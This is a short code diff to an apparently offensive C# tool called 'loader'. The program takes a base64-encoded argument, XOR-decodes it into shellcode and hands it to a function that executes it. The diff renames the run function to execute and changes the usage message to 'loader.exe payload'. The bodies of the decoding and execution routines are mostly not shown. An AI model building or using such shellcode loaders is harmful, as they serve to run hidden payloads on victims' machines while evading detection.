@@ -9,12 +9,12 @@ namespace loader
         {
             if (args.Length == 0 || args[0].Contains("+") || args[0].Contains("/"))
             {
-                Console.WriteLine("args error.");
+                Console.WriteLine("loader.exe payload");
                 Environment.Exit(0);
             }
             string str = args[0].TrimEnd('=').Replace('-', '+').Replace('_', '/');
             byte[] code = xor(Convert.FromBase64String(str));
-            run(code);
+            execute(code);
         }
 
         public static byte[] xor(byte[] input)
@@ -28,7 +28,7 @@ namespace loader
             return output;
         }
 
-        public static bool run(byte[] shellcode)
+        public static bool execute(byte[] shellcode)
         {
             try
             {
